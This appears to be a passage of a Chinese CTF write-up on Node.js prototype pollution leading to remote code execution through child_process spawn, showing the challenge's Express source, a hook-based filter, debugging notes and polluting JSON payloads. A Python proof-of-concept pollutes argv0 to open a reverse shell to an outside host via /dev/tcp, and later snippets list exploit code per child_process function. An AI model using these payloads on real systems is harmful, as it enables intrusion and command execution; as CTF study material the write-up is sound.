+  <span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">f</span><span class="p">;</span>
+
+  <span class="nx">file</span> <span class="o">=</span> <span class="nx">file</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\.\.\//g</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
+  <span class="nx">rootpath</span> <span class="o">=</span> <span class="nx">rootpath</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\.\.\//g</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="nx">rootpath</span> <span class="o">===</span> <span class="s1">''</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">file</span> <span class="o">===</span> <span class="s1">''</span><span class="p">){</span>
+      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">'try to find parameters HaHa'</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">rootpath</span> <span class="o">=</span> <span class="s2">"static"</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="kr">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="nx">rootpath</span> <span class="o">+</span> <span class="s2">"/"</span> <span class="o">+</span> <span class="nx">file</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">filePath</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">'File not found'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">fileData</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">'Error reading file:'</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">'Error reading file'</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nx">zlib</span><span class="p">.</span><span class="nx">gzip</span><span class="p">(</span><span class="nx">fileData</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">compressedData</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">'Error compressing file:'</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">'Error compressing file'</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="kr">const</span> <span class="nx">base64Data</span> <span class="o">=</span> <span class="nx">compressedData</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">);</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">base64Data</span><span class="p">);</span>
+    <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/report"</span><span class="p">,</span> <span class="nx">verifyAdmin</span> <span class="p">,(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="s2">"/static/report_noway_dirsearch.html"</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/report"</span><span class="p">,</span> <span class="nx">verifyAdmin</span> <span class="p">,(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="p">{</span><span class="nx">user</span><span class="p">,</span> <span class="nx">date</span><span class="p">,</span> <span class="nx">reportmessage</span><span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">Reportcache</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">Reportcache</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="p">}</span>
+  <span class="nx">Reportcache</span><span class="p">[</span><span class="nx">user</span><span class="p">][</span><span class="nx">date</span><span class="p">]</span> <span class="o">=</span> <span class="nx">reportmessage</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('Report Success');window.location.href='/report'&lt;/script&gt;"</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/countreport'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">user</span> <span class="k">in</span> <span class="nx">Reportcache</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">count</span> <span class="o">+=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">Reportcache</span><span class="p">[</span><span class="nx">user</span><span class="p">]).</span><span class="nx">length</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">count</span> <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="c1">//查看当前运行用户</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/VanZY_s_T3st"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">command</span> <span class="o">=</span> <span class="s1">'whoami'</span><span class="p">;</span>
+  <span class="kr">const</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="nx">command</span> <span class="p">,[]);</span>
+  <span class="nx">cmd</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">end</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
+  <span class="p">});</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Server running on http://localhost:3000'</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>有其它patch</p>
+<div class="highlight"><pre><span></span><span class="p">{</span>
+  <span class="s2">"dependencies"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="s2">"body-parser"</span><span class="p">:</span> <span class="s2">"^1.20.3"</span><span class="p">,</span>
+    <span class="s2">"cookie-parser"</span><span class="p">:</span> <span class="s2">"^1.4.6"</span><span class="p">,</span>
+    <span class="s2">"crypto"</span><span class="p">:</span> <span class="s2">"^1.0.1"</span><span class="p">,</span>
+    <span class="s2">"express"</span><span class="p">:</span> <span class="s2">"^4.21.0"</span><span class="p">,</span>
+    <span class="s2">"jsonwebtoken"</span><span class="p">:</span> <span class="s2">"^9.0.2"</span><span class="p">,</span>
+    <span class="s2">"mysql"</span><span class="p">:</span> <span class="s2">"^2.18.1"</span><span class="p">,</span>
+    <span class="s2">"node-rsa"</span><span class="p">:</span> <span class="s2">"^1.1.1"</span><span class="p">,</span>
+    <span class="s2">"path"</span><span class="p">:</span> <span class="s2">"^0.12.7"</span><span class="p">,</span>
+    <span class="s2">"require-in-the-middle"</span><span class="p">:</span> <span class="s2">"^7.4.0"</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>handle/index.js</p>
+<div class="highlight"><pre><span></span><span class="n">var</span> <span class="n">ritm</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">'require-in-the-middle'</span><span class="p">);</span>
+<span class="n">var</span> <span class="n">patchChildProcess</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">'./child_process'</span><span class="p">);</span>
+
+<span class="n">new</span> <span class="n">ritm</span><span class="o">.</span><span class="n">Hook</span><span class="p">(</span>
+    <span class="p">[</span><span class="s1">'child_process'</span><span class="p">],</span>
+    <span class="n">function</span> <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">switch</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">case</span> <span class="s1">'child_process'</span><span class="p">:</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="n">patchChildProcess</span><span class="p">(</span><span class="n">module</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">);</span>
+</pre></div>
+<p>handle/child_process.js</p>
+<div class="highlight"><pre><span></span><span class="n">function</span> <span class="n">patchChildProcess</span><span class="p">(</span><span class="n">cp</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="n">cp</span><span class="o">.</span><span class="n">execFile</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Proxy</span><span class="p">(</span><span class="n">cp</span><span class="o">.</span><span class="n">execFile</span><span class="p">,</span> <span class="p">{</span> <span class="nb">apply</span><span class="p">:</span> <span class="n">patchOptions</span><span class="p">(</span><span class="n">true</span><span class="p">)</span> <span class="p">});</span>
+    <span class="n">cp</span><span class="o">.</span><span class="n">fork</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Proxy</span><span class="p">(</span><span class="n">cp</span><span class="o">.</span><span class="n">fork</span><span class="p">,</span> <span class="p">{</span> <span class="nb">apply</span><span class="p">:</span> <span class="n">patchOptions</span><span class="p">(</span><span class="n">true</span><span class="p">)</span> <span class="p">});</span>
+    <span class="n">cp</span><span class="o">.</span><span class="n">spawn</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Proxy</span><span class="p">(</span><span class="n">cp</span><span class="o">.</span><span class="n">spawn</span><span class="p">,</span> <span class="p">{</span> <span class="nb">apply</span><span class="p">:</span> <span class="n">patchOptions</span><span class="p">(</span><span class="n">true</span><span class="p">)</span> <span class="p">});</span>
+    <span class="n">cp</span><span class="o">.</span><span class="n">execFileSync</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Proxy</span><span class="p">(</span><span class="n">cp</span><span class="o">.</span><span class="n">execFileSync</span><span class="p">,</span> <span class="p">{</span> <span class="nb">apply</span><span class="p">:</span> <span class="n">patchOptions</span><span class="p">(</span><span class="n">true</span><span class="p">)</span> <span class="p">});</span>
+    <span class="n">cp</span><span class="o">.</span><span class="n">execSync</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Proxy</span><span class="p">(</span><span class="n">cp</span><span class="o">.</span><span class="n">execSync</span><span class="p">,</span> <span class="p">{</span> <span class="nb">apply</span><span class="p">:</span> <span class="n">patchOptions</span><span class="p">()</span> <span class="p">});</span>
+    <span class="n">cp</span><span class="o">.</span><span class="n">spawnSync</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Proxy</span><span class="p">(</span><span class="n">cp</span><span class="o">.</span><span class="n">spawnSync</span><span class="p">,</span> <span class="p">{</span> <span class="nb">apply</span><span class="p">:</span> <span class="n">patchOptions</span><span class="p">(</span><span class="n">true</span><span class="p">)</span> <span class="p">});</span>
+
+    <span class="k">return</span> <span class="n">cp</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">function</span> <span class="n">patchOptions</span><span class="p">(</span><span class="n">hasArgs</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">function</span> <span class="nb">apply</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">thisArg</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">var</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">===</span> <span class="n">args</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">prototypelessSpawnOpts</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&lt;</span> <span class="n">args</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">hasArgs</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">Array</span><span class="o">.</span><span class="n">isArray</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">])</span> <span class="o">||</span> <span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">==</span> <span class="n">null</span><span class="p">))</span> <span class="p">{</span>
+                <span class="n">pos</span><span class="o">++</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">typeof</span> <span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'object'</span> <span class="o">&amp;&amp;</span> <span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">!==</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">prototypelessSpawnOpts</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">prototypelessSpawnOpts</span><span class="p">();</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">typeof</span> <span class="n">args</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'function'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">args</span><span class="o">.</span><span class="n">splice</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">prototypelessSpawnOpts</span><span class="p">());</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">target</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="n">thisArg</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
+    <span class="p">};</span>
+<span class="p">}</span>
+
+<span class="n">function</span> <span class="n">prototypelessSpawnOpts</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">var</span> <span class="n">prototypelessObj</span> <span class="o">=</span> <span class="n">Object</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">Object</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">null</span><span class="p">),</span> <span class="n">obj</span><span class="p">);</span>
+    <span class="n">prototypelessObj</span><span class="o">.</span><span class="n">env</span> <span class="o">=</span> <span class="n">Object</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">Object</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">null</span><span class="p">),</span> <span class="n">prototypelessObj</span><span class="o">.</span><span class="n">env</span> <span class="o">||</span> <span class="n">process</span><span class="o">.</span><span class="n">env</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">prototypelessObj</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="n">patchChildProcess</span><span class="p">;</span>
+</pre></div>
+<p>审计源码，我们可以看出改题目有可控的原型链污染利用点，但是还有原型链污染执行spwn命令的hock waf需要我们绕过，其实就是上面我们分析利用的spwn命令Prototype Pollution to RCE</p>
+<h4 data-content="1" id="3e68d3b3af4a5130d26d1be1bf287a99">spawn Prototype Pollution to RCE调试分析</h4>
+<p>我们先调试传入如下</p>
+<pre><code>{"user":"__proto__","date":"2","reportmessage":{"shell":"calc.exe"}</code></pre>
+<p>发现成功污染上</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241003135610-3065c716-814c-1.png"/></p>
+<p>并且调试发现传入的args长度固定是2（因为传入的args是固定的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241003135404-e56b9c22-814b-1.png"/></p>
+<p>根据函数得判断逻辑，只有在<code>pos=2</code>，并且<code>typeof args[pos] === 'object' &amp;&amp; args[pos] !== null</code>时候才能调用<code>prototypelessSpawnOpts(args[pos])</code></p>
+<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">patchOptions</span><span class="p">(</span><span class="nx">hasArgs</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="kd">function</span> <span class="nx">apply</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">thisArg</span><span class="p">,</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">pos</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">pos</span> <span class="o">===</span> <span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prototypelessSpawnOpts</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">pos</span> <span class="o">&lt;</span> <span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">hasArgs</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">])</span> <span class="o">||</span> <span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">==</span> <span class="kc">null</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nx">pos</span><span class="o">++</span><span class="p">;</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">])</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'object'</span> <span class="o">&amp;&amp;</span> <span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">])</span>
+                <span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prototypelessSpawnOpts</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">=</span> <span class="nx">prototypelessSpawnOpts</span><span class="p">();</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">args</span><span class="p">[</span><span class="nx">pos</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'function'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">args</span><span class="p">.</span><span class="nx">splice</span><span class="p">(</span><span class="nx">pos</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">prototypelessSpawnOpts</span><span class="p">());</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nx">target</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">thisArg</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
+    <span class="p">};</span>
+<span class="p">}</span>
+</pre></div>
+<p>并调试过程发现spawn函数传入的args虽然长度还是2，但是他的<strong>proto</strong>存在并且下标为2的值被污染上的<code>{shell: 'calc.exe'}</code>，也正如文章上面我们的分析所说<code>spawn</code> 函数通过<strong>对象</strong>接收参数</p>
+<p>那么当<code>args[2]</code>不存在时，就回去上层<code>Object</code>里面去找下标为，这是便存在成功进入<code>prototypelessSpawnOpts(args[pos])</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241003135416-eca28514-814b-1.png"/></p>
+<p>再看函数逻辑，只要obj不是null，就可以绕过。<br/>
+这个函数负责创建一个没有原型链的对象，并复制环境变量。</p>
+<ul>
+<li>
+<strong>创建无原型链的对象</strong>：使用 <code>Object.create(null)</code> 创建一个没有原型链的对象。</li>
+<li>
+<p><strong>复制环境变量</strong>：确保 <code>env</code> 属性也是一个无原型链的对象，并默认使用 <code>process.env</code>。<br/>
+```js<br/>
+function prototypelessSpawnOpts(obj) {<br/>
+  var prototypelessObj = Object.assign(Object.create(null), obj);<br/>
+  prototypelessObj.env = Object.assign(Object.create(null), prototypelessObj.env || process.env);</p>
+<p>return prototypelessObj;</p>
+</li>
+</ul>
+<p>}</p>
+<pre><code>可以利用新版本nodejs  Prototype Pollution to RCE，污染2这个key
+
+```json
+{"user":"__proto__","date":"2","reportmessage":{"env":{"NODE_OPTIONS":"-r /proc/self/environ","NODE_DEBUG":"require('child_process').execSync('touch /tmp/kaikaix');process.exit();//"},"shell":"/readflag"}}</code></pre>
+<h4 data-content="1" id="492e2602e7237347092445b9a99a9a86">命令执行的多种方法</h4>
+<ul>
+<li>
+<p>方法一<br/>
+由于题目中有<code>/readflag</code>，便可以直接执行/readflag</p>
+<pre><code>{"user":"__proto__","date":"2","reportmessage":{"shell": "/readflag"}}</code></pre>
+</li>
+<li>
+<p>方法二</p>
+</li>
+</ul>
+<p>该题目我们写poc脚本污染上，执行反弹shell</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">remote_addr</span> <span class="o">=</span> <span class="s1">'http://1.95.87.154:22483'</span>
+<span class="n">rs</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">remote_addr</span><span class="o">+</span><span class="s2">"/login"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="s2">"DbT33V+xr+TZQm+pYfR5qyShF8Ok5hzF5kMCEL/reDznBsBCb3+2n73qElMY4N9FOxBddIfkSX90m3eAtmJV4WsQDHVVzlkhIbDiKrJr3djl8z/aZo6K7nLTD85D2t97lkjvon3oQOpZ8ArpYRsAHkWxA0KuOYLkmlyNcDpUG8o="</span><span class="p">})</span>
+    <span class="k">assert</span> <span class="s1">'Login Success'</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span>
+
+<span class="n">login</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add_report</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">date</span><span class="p">,</span><span class="n">report</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">remote_addr</span><span class="o">+</span><span class="s2">"/report"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">"user"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s2">"date"</span><span class="p">:</span><span class="n">date</span><span class="p">,</span><span class="s2">"reportmessage"</span><span class="p">:</span><span class="n">report</span><span class="p">})</span>
+    <span class="k">assert</span> <span class="s1">'Report Success'</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span>
+
+<span class="n">add_report</span><span class="p">(</span><span class="s2">"__proto__"</span><span class="p">,</span><span class="mi">2</span><span class="p">,{</span><span class="s2">"shell"</span><span class="p">:</span><span class="s2">"/proc/self/exe"</span><span class="p">,</span><span class="s2">"argv0"</span><span class="p">:</span><span class="s2">"console.log(require('child_process').execSync('bash -c </span><span class="se">\"</span><span class="s2">/bin/sh -i &gt;&amp; /dev/tcp/123.45.6.7/9999 0&gt;&amp;1</span><span class="se">\"</span><span class="s2">').toString())//"</span><span class="p">,</span><span class="s2">"env"</span><span class="p">:{</span><span class="s2">"NODE_OPTIONS"</span><span class="p">:</span><span class="s2">"--require /proc/self/cmdline"</span><span class="p">}})</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"user"</span><span class="p">:</span><span class="s2">"__proto__"</span><span class="p">,</span><span class="nt">"date"</span><span class="p">:</span><span class="s2">"2"</span><span class="p">,</span><span class="nt">"reportmessage"</span><span class="p">:{</span><span class="nt">"env"</span><span class="p">:{</span><span class="nt">"NODE_OPTIONS"</span><span class="p">:</span><span class="s2">"-r /proc/self/environ"</span><span class="p">,</span><span class="nt">"NODE_DEBUG"</span><span class="p">:</span><span class="s2">"require('child_process').execSync('touch /tmp/kaikaix');process.exit();//"</span><span class="p">},</span><span class="nt">"shell"</span><span class="p">:</span><span class="s2">"/readflag"</span><span class="p">}}</span>
+</pre></div>
+<h3 data-content="1" id="2d3981205c7c9d8e83ef3a52693d0d4a">PP2RCE 漏洞 child_process 函数</h3>
+<p>下面列一下<code>child_proces</code> 中的每个函数的漏洞利用代码RCE方便以后见到不用函数进行利用</p>
+<h4 data-content="1" id="d4c3caab28fa50143d61607e33d029a4">exec</h4>
+<div class="highlight"><pre><span></span><span class="c1">// environ trick - not working</span>
+<span class="c1">// It's not possible to pollute the .env attr to create a first env var</span>
+<span class="c1">// because options.env is null (not undefined)</span>
+
+<span class="c1">// cmdline trick - working with small variation</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"</span>
